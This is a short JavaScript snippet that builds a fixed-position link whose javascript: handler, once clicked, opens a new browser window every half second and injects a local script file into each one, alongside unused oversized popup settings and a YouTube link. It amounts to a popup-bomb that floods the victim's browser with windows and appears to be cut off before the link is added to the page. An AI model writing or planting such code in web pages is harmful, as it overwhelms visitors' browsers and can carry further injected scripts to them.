var popupProperties='width=10000,height=10000,toolbar=0,location=0,resizable=1';
var newA = document.createElement("a");
var url = 'https://www.youtube.com/watch?v=9cPxh2DikIA&ab_channel=BURGERKING';
newA.setAttribute("href","javascript:setInterval(function() {var win = window.open(''); var script = document.createElement('script'); script.src = 'js/myScript.js'; win.document.head.appendChild(script);}, 500);");
newA.setAttribute("style","position:fixed;z-index:9999999;top:0;left:0;width:100px;height:100px;color:#000;background:#fff;display:block;");
